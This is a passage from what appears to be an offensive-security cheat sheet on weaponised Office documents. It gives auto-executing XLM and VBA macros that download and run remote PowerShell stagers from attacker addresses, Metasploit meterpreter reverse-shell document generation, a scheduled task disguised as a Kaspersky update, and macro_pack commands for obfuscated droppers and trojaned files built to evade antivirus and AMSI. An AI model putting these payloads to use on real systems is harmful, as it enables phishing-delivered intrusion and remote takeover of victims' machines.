</span></span></code></pre></div><p>When using Macrome build mode, the &ndash;password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of <strong>VelvetSweatshop</strong> is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.</p><h2 id=xlm-excel-40---sharpshooter>XLM Excel 4.0 - SharpShooter
<a class=anchor href=#xlm-excel-40---sharpshooter>#</a></h2><ul><li><a href=https://github.com/mdsecactivebreach/SharpShooter>https://github.com/mdsecactivebreach/SharpShooter</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Options</span>
</span></span><span style=display:flex><span>-rawscfile &lt;path&gt;  Path to raw shellcode file <span style=color:#66d9ef>for</span> stageless payloads
</span></span><span style=display:flex><span>--scfile &lt;path&gt;    Path to shellcode file as CSharp byte array
</span></span><span style=display:flex><span>python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Creation of a VBA Macro</span>
</span></span><span style=display:flex><span><span style=color:#75715e># creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.</span>
</span></span><span style=display:flex><span>SharpShooter.py --stageless --dotnetver <span style=color:#ae81ff>2</span> --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http<span style=color:#960050;background-color:#1e0010>:</span>//<span style=color:#ae81ff>192.168</span>.2.<span style=color:#ae81ff>8</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>8080</span>/foo.xsl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Creation of an Excel 4.0 SLK Macro Enabled Document</span>
</span></span><span style=display:flex><span>~<span style=color:#75715e># /!\ The shellcode cannot contain null bytes</span>
</span></span><span style=display:flex><span>msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style=color:#f92672>-f</span> raw -o shellcode-encoded.bin -b <span style=color:#e6db74>&#39;\x00&#39;</span>
</span></span><span style=display:flex><span>SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai <span style=color:#f92672>-f</span> raw -o /tmp/shellcode-<span style=color:#ae81ff>86</span>.bin -b <span style=color:#e6db74>&#39;\x00&#39;</span>
</span></span><span style=display:flex><span>SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-<span style=color:#ae81ff>86</span>.bin --smuggle --template mcafee
</span></span></code></pre></div><h2 id=xlm-excel-40---excelntdonut>XLM Excel 4.0 - EXCELntDonut
<a class=anchor href=#xlm-excel-40---excelntdonut>#</a></h2><ul><li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li><li>AMSI has no visibility into XLM macros (for now)</li><li>Anti-virus struggles with XLM (for now)</li><li>XLM macros can access the Win32 API (virtualalloc, createthread, &mldr;)</li></ul><ol><li>Open an Excel Workbook.</li><li>Right click on &ldquo;Sheet 1&rdquo; and click &ldquo;Insert&mldr;&rdquo;. Select &ldquo;MS Excel 4.0 Macro&rdquo;.</li><li>Open your EXCELntDonut output file in a text editor and copy everything.</li><li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li><li>At this point, everything is in column A. To fix that, we&rsquo;ll use the &ldquo;Text-to-Columns&rdquo;/&ldquo;Convert&rdquo; tool under the &ldquo;Data&rdquo; tab.</li><li>Highlight column A and open the &ldquo;Text-to-Columns&rdquo; tool. Select &ldquo;Delimited&rdquo; and then &ldquo;Semicolon&rdquo; on the next screen. Select &ldquo;Finished&rdquo;.</li><li>Right-click on cell A1* and select &ldquo;Run&rdquo;. This will execute your payload to make sure it works.</li><li>To enable auto-execution, we need to rename cell A1* to &ldquo;Auto_Open&rdquo;. You can do this by clicking into cell A1 and then clicking into the box that says &ldquo;A1&rdquo;* just above Column A. Change the text from &ldquo;A1&rdquo;* to &ldquo;Auto_Open&rdquo;. Save the file and verify that auto-execution works.</li></ol><p>:warning: If you&rsquo;re using the obfuscate flag, after the Text-to-columns operation, your macros won&rsquo;t start in A1. Instead, they&rsquo;ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let&rsquo;s say that cell is HJ1. If that&rsquo;s the case, then complete steps 6-7 substituting HJ1 for A1</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/FortyNorthSecurity/EXCELntDonut
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>-f</span> path to file containing your C<span style=color:#75715e># source code (exe or dll)</span>
</span></span><span style=display:flex><span>-c ClassName where method that you want to call lives (dll)
</span></span><span style=display:flex><span>-m Method containing your executable payload (dll)
</span></span><span style=display:flex><span>-r References needed to compile your C<span style=color:#75715e># code (ex: -r &#39;System.Management&#39;)</span>
</span></span><span style=display:flex><span>-o output filename
</span></span><span style=display:flex><span>--sandbox Perform basic sandbox checks. 
</span></span><span style=display:flex><span>--obfuscate Perform basic macro obfuscation. 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Fork</span>
</span></span><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py
</span></span><span style=display:flex><span>C:\Windows\Microsoft.NET\Framework64\v4.0.<span style=color:#ae81ff>30319</span>\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\Users\User\Desktop\covenSource.cs 
</span></span><span style=display:flex><span>C:\Windows\Microsoft.NET\Framework64\v4.0.<span style=color:#ae81ff>30319</span>\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\Users\User\Desktop\covenSource.cs
</span></span><span style=display:flex><span>donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe
</span></span><span style=display:flex><span>donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe
</span></span><span style=display:flex><span>usage<span style=color:#960050;background-color:#1e0010>:</span> drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]
</span></span><span style=display:flex><span>python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
</span></span></code></pre></div><p>XLM: <a href=https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md>https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</a></p><h2 id=xlm-excel-40---exec>XLM Excel 4.0 - EXEC
<a class=anchor href=#xlm-excel-40---exec>#</a></h2><ol><li>Right Click to the current sheet</li><li>Insert a <strong>Macro IntL MS Excel 4.0</strong></li><li>Add the <code>EXEC</code> macro<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>=EXEC(<span style=color:#e6db74>&#34;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&#34;</span>)
</span></span><span style=display:flex><span>=halt()
</span></span></code></pre></div></li><li>Rename cell to <strong>Auto_open</strong></li><li>Hide your macro worksheet by a right mouse click on the sheet name <strong>Macro1</strong> and selecting <strong>Hide</strong></li></ol><h2 id=docm---metasploit>DOCM - Metasploit
<a class=anchor href=#docm---metasploit>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>use exploit/multi/fileformat/office_word_macro
</span></span><span style=display:flex><span>set payload windows/meterpreter/reverse_http
</span></span><span style=display:flex><span>set LHOST <span style=color:#ae81ff>10.10</span>.10.10
</span></span><span style=display:flex><span>set LPORT <span style=color:#ae81ff>80</span>
</span></span><span style=display:flex><span>set DisablePayloadHandler True
</span></span><span style=display:flex><span>set PrependMigrate True
</span></span><span style=display:flex><span>set FILENAME Financial2021.docm
</span></span><span style=display:flex><span>exploit -j
</span></span></code></pre></div><h2 id=docm---download-and-execute>DOCM - Download and Execute
<a class=anchor href=#docm---download-and-execute>#</a></h2><blockquote><p>Detected by Defender (AMSI)</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Sub Execute()
</span></span><span style=display:flex><span>Dim payload
</span></span><span style=display:flex><span>payload = <span style=color:#e6db74>&#34;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={</span>$true<span style=color:#e6db74>};</span>$v<span style=color:#e6db74>=new-object net.webclient;</span>$v<span style=color:#e6db74>.proxy=[Net.WebRequest]::GetSystemWebProxy();</span>$v<span style=color:#e6db74>.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX </span>$v<span style=color:#e6db74>.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&#34;</span>
</span></span><span style=display:flex><span>Call Shell(payload, vbHide)
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>Sub Document_Open()
</span></span><span style=display:flex><span>Execute
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span></code></pre></div><h2 id=docm---macro-creator>DOCM - Macro Creator
<a class=anchor href=#docm---macro-creator>#</a></h2><ul><li><a href=https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span><span style=color:#75715e># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:</span>
</span></span><span style=display:flex><span>C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
</span></span><span style=display:flex><span><span style=color:#75715e># Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:</span>
</span></span><span style=display:flex><span>C:\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
</span></span><span style=display:flex><span><span style=color:#75715e># Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:</span>
</span></span><span style=display:flex><span>C:\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url <span style=color:#e6db74>&#39;http://my.server.com/sources.xml&#39;</span> -d biblio -c <span style=color:#e6db74>&#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39;</span> -o -e
</span></span></code></pre></div><h2 id=docm---c-converted-to-office-vba-macro>DOCM - C# converted to Office VBA macro
<a class=anchor href=#docm---c-converted-to-office-vba-macro>#</a></h2><blockquote><p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p></blockquote><p><a href=https://github.com/trustedsec/unicorn>https://github.com/trustedsec/unicorn</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>python unicorn.py payload.cs cs macro
</span></span></code></pre></div><h2 id=docm---vba-wscript>DOCM - VBA Wscript
<a class=anchor href=#docm---vba-wscript>#</a></h2><blockquote><p><a href=https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Sub parent_change()
</span></span><span style=display:flex><span>    Dim objOL
</span></span><span style=display:flex><span>    Set objOL = CreateObject(<span style=color:#e6db74>&#34;Outlook.Application&#34;</span>)
</span></span><span style=display:flex><span>    Set shellObj = objOL.CreateObject(<span style=color:#e6db74>&#34;Wscript.Shell&#34;</span>)
</span></span><span style=display:flex><span>    shellObj.Run(<span style=color:#e6db74>&#34;notepad.exe&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>Sub AutoOpen()
</span></span><span style=display:flex><span>    parent_change
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>Sub Auto_Open()
</span></span><span style=display:flex><span>    parent_change
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span>CreateObject(<span style=color:#e6db74>&#34;WScript.Shell&#34;</span>).Run <span style=color:#e6db74>&#34;calc.exe&#34;</span>
</span></span><span style=display:flex><span>CreateObject(<span style=color:#e6db74>&#34;WScript.Shell&#34;</span>).Exec <span style=color:#e6db74>&#34;notepad.exe&#34;</span>
</span></span></code></pre></div><h2 id=docm---vba-shell-execute-comment>DOCM - VBA Shell Execute Comment
<a class=anchor href=#docm---vba-shell-execute-comment>#</a></h2><p>Set your command payload inside the <strong>Comment</strong> metadata of the document.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>beautifulcomment</span>()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> p <span style=color:#f92672>As</span> DocumentProperty
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>For</span> <span style=color:#66d9ef>Each</span> p <span style=color:#f92672>In</span> ActiveDocument.BuiltInDocumentProperties
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>If</span> p.Name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Comments&#34;</span> <span style=color:#66d9ef>Then</span>
</span></span><span style=display:flex><span>            Shell (p.Value)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>End</span> <span style=color:#66d9ef>If</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Next</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>AutoExec</span>()
</span></span><span style=display:flex><span>    beautifulcomment
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>AutoOpen</span>()
</span></span><span style=display:flex><span>    beautifulcomment
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span></code></pre></div><h2 id=docm---vba-spawning-via-svchostexe-using-scheduled-task>DOCM - VBA Spawning via svchost.exe using Scheduled Task
<a class=anchor href=#docm---vba-spawning-via-svchostexe-using-scheduled-task>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Sub AutoOpen()
</span></span><span style=display:flex><span>    Set service = CreateObject(<span style=color:#e6db74>&#34;Schedule.Service&#34;</span>)
</span></span><span style=display:flex><span>    Call service.Connect
</span></span><span style=display:flex><span>    Dim td<span style=color:#960050;background-color:#1e0010>:</span> Set td = service.NewTask(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    td.RegistrationInfo.Author = <span style=color:#e6db74>&#34;Kaspersky Corporation&#34;</span>
</span></span><span style=display:flex><span>    td.settings.StartWhenAvailable = True
</span></span><span style=display:flex><span>    td.settings.Hidden = False
</span></span><span style=display:flex><span>    Dim triggers<span style=color:#960050;background-color:#1e0010>:</span> Set triggers = td.triggers
</span></span><span style=display:flex><span>    Dim trigger<span style=color:#960050;background-color:#1e0010>:</span> Set trigger = triggers.Create(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    Dim startTime<span style=color:#960050;background-color:#1e0010>:</span> ts = DateAdd(<span style=color:#e6db74>&#34;s&#34;</span>, <span style=color:#ae81ff>30</span>, Now)
</span></span><span style=display:flex><span>    startTime = Year(ts) &amp; <span style=color:#e6db74>&#34;-&#34;</span> &amp; Right(Month(ts), <span style=color:#ae81ff>2</span>) &amp; <span style=color:#e6db74>&#34;-&#34;</span> &amp; Right(Day(ts), <span style=color:#ae81ff>2</span>) &amp; <span style=color:#e6db74>&#34;T&#34;</span> &amp; Right(Hour(ts), <span style=color:#ae81ff>2</span>) &amp; <span style=color:#e6db74>&#34;:&#34;</span> &amp; Right(Minute(ts), <span style=color:#ae81ff>2</span>) &amp; <span style=color:#e6db74>&#34;:&#34;</span> &amp; Right(Second(ts), <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>    trigger.StartBoundary = startTime
</span></span><span style=display:flex><span>    trigger.ID = <span style=color:#e6db74>&#34;TimeTriggerId&#34;</span>
</span></span><span style=display:flex><span>    Dim Action<span style=color:#960050;background-color:#1e0010>:</span> Set Action = td.Actions.Create(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    Action.Path = <span style=color:#e6db74>&#34;C:\Windows\System32\powershell.exe&#34;</span>
</span></span><span style=display:flex><span>    Action.Arguments = <span style=color:#e6db74>&#34;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&#34;</span>
</span></span><span style=display:flex><span>    Call service.GetFolder(<span style=color:#e6db74>&#34;\&#34;</span>).RegisterTaskDefinition(<span style=color:#e6db74>&#34;AVUpdateTask&#34;</span>, td, <span style=color:#ae81ff>6</span>, , , <span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>Rem powershell.exe -nop -w hidden -c <span style=color:#e6db74>&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&#34;</span>
</span></span></code></pre></div><h2 id=docm---wmi-com-functions>DOCM - WMI COM functions
<a class=anchor href=#docm---wmi-com-functions>#</a></h2><p>Basic WMI exec (detected by Defender) : <code>r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Sub wmi_exec()
</span></span><span style=display:flex><span>    strComputer = <span style=color:#e6db74>&#34;.&#34;</span>
</span></span><span style=display:flex><span>    Set objWMIService = GetObject(<span style=color:#e6db74>&#34;winmgmts:\\&#34;</span> &amp; strComputer &amp; <span style=color:#e6db74>&#34;\root\cimv2&#34;</span>)
</span></span><span style=display:flex><span>    Set objStartUp = objWMIService.Get(<span style=color:#e6db74>&#34;Win32_ProcessStartup&#34;</span>)
</span></span><span style=display:flex><span>    Set objProc = objWMIService.Get(<span style=color:#e6db74>&#34;Win32_Process&#34;</span>)
</span></span><span style=display:flex><span>    Set procStartConfig = objStartUp.SpawnInstance_
</span></span><span style=display:flex><span>    procStartConfig.ShowWindow = <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    objProc.Create <span style=color:#e6db74>&#34;powershell.exe&#34;</span>, Null, procStartConfig, intProcessID
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span></code></pre></div><ul><li><a href=https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</a></li><li><a href=https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Sub ASR_bypass_create_child_process_rule5()
</span></span><span style=display:flex><span>    Const HIDDEN_WINDOW = <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    strComputer = <span style=color:#e6db74>&#34;.&#34;</span>
</span></span><span style=display:flex><span>    Set objWMIService = GetObject(<span style=color:#e6db74>&#34;win&#34;</span> &amp; <span style=color:#e6db74>&#34;mgmts&#34;</span> &amp; <span style=color:#e6db74>&#34;:\\&#34;</span> &amp; strComputer &amp; <span style=color:#e6db74>&#34;\root&#34;</span> &amp; <span style=color:#e6db74>&#34;\cimv2&#34;</span>)
</span></span><span style=display:flex><span>    Set objStartup = objWMIService.Get(<span style=color:#e6db74>&#34;Win32_&#34;</span> &amp; <span style=color:#e6db74>&#34;Process&#34;</span> &amp; <span style=color:#e6db74>&#34;Startup&#34;</span>)
</span></span><span style=display:flex><span>    Set objConfig = objStartup.SpawnInstance_
</span></span><span style=display:flex><span>    objConfig.ShowWindow = HIDDEN_WINDOW
</span></span><span style=display:flex><span>    Set objProcess = GetObject(<span style=color:#e6db74>&#34;winmgmts:\\&#34;</span> &amp; strComputer &amp; <span style=color:#e6db74>&#34;\root&#34;</span> &amp; <span style=color:#e6db74>&#34;\cimv2&#34;</span> &amp; <span style=color:#e6db74>&#34;:Win32_&#34;</span> &amp; <span style=color:#e6db74>&#34;Process&#34;</span>)
</span></span><span style=display:flex><span>    objProcess.Create <span style=color:#e6db74>&#34;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&#34;</span>, Null, objConfig, intProcessID
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sub AutoExec()
</span></span><span style=display:flex><span>    ASR_bypass_create_child_process_rule5
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Sub AutoOpen()
</span></span><span style=display:flex><span>    ASR_bypass_create_child_process_rule5
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> Sub
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>Const ShellWindows = <span style=color:#e6db74>&#34;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&#34;</span>
</span></span><span style=display:flex><span>Set SW = GetObject(<span style=color:#e6db74>&#34;new:&#34;</span> &amp; ShellWindows).Item()
</span></span><span style=display:flex><span>SW.Document.Application.ShellExecute <span style=color:#e6db74>&#34;cmd.exe&#34;</span>, <span style=color:#e6db74>&#34;/c powershell.exe&#34;</span>, <span style=color:#e6db74>&#34;C:\Windows\System32&#34;</span>, Null, <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><h2 id=docmxlm---macro-pack---macro-and-dde>DOCM/XLM - Macro Pack - Macro and DDE
<a class=anchor href=#docmxlm---macro-pack---macro-and-dde>#</a></h2><blockquote><p>Only the community version is available online.</p></blockquote><ul><li><a href=https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe>https://github.com/sevagas/macro_pack</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Options</span>
</span></span><span style=display:flex><span>-G, --generate=OUTPUT_FILE_PATH. Generates a file. 
</span></span><span style=display:flex><span>-t, --template=TEMPLATE_NAME    Use code template already included <span style=color:#66d9ef>in</span> MacroPack
</span></span><span style=display:flex><span>-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate <span style=color:#66d9ef>function</span>s and variables name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Execute a command</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;calc.exe&#34;</span> | macro_pack.exe -t CMD -G cmd.xsl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Download and execute a file</span>
</span></span><span style=display:flex><span>echo &lt;file_to_drop_url&gt; <span style=color:#e6db74>&#34;&lt;download_path&gt;&#34;</span> | macro_pack.exe -t DROPPER -o -G dropper.xls
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Meterpreter reverse TCP template using MacroMeter by Cn33liz</span>
</span></span><span style=display:flex><span>echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Drop and execute embedded file</span>
</span></span><span style=display:flex><span>macro_pack.exe -t EMBED_EXE --embed=c:\windows\system32\calc.exe -o -G my_calc.vbs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Obfuscate the vba file generated by msfvenom and put result in a new vba file.</span>
</span></span><span style=display:flex><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span style=color:#ae81ff>192.168</span>.0.5 <span style=color:#f92672>-f</span> vba | macro_pack.exe -o -G meterobf.vba
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Obfuscate Empire stager vba file and generate a MS Word document:</span>
</span></span><span style=display:flex><span>macro_pack.exe <span style=color:#f92672>-f</span> empire.vba -o -G myDoc.docm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;https://myurl.url/payload.exe&#34;</span> <span style=color:#e6db74>&#34;dropped.exe&#34;</span> |  macro_pack.exe -o -t DROPPER -G <span style=color:#e6db74>&#34;drop.xlsm&#34;</span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Execute calc.exe via Dynamic Data Exchange (DDE) attack</span>
</span></span><span style=display:flex><span>echo calc.exe | macro_pack.exe --dde -G calc.xslx
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Download and execute file via powershell using Dynamic Data Exchange (DDE) attack</span>
</span></span><span style=display:flex><span>macro_pack.exe --dde <span style=color:#f92672>-f</span> ..\resources\community\ps_dl_exec.cmd -G DDE.xsl
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).</span>
</span></span><span style=display:flex><span>msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=<span style=color:#ae81ff>192.168</span>.0.5 <span style=color:#f92672>-f</span> vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.</span>
</span></span><span style=display:flex><span>msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=<span style=color:#ae81ff>192.168</span>.0.5 <span style=color:#f92672>-f</span> vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: Generate an HTA payload able to run a shellcode via Excel injection</span>
</span></span><span style=display:flex><span>echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel -o -G samples\nicepic.hta
</span></span><span style=display:flex><span>echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\my_shortcut.lnk
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: XLM Injection</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;MPPro&#34;</span> | macro_pack.exe -G _samples\hello.doc -t HELLO --xlm --run-in-excel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: ShellCode Exec - Heap Injection, AlternativeInjection</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;x32calc.bin&#34;</span> | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;x32calc.bin&#34;</span> | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PRO: More shellcodes</span>
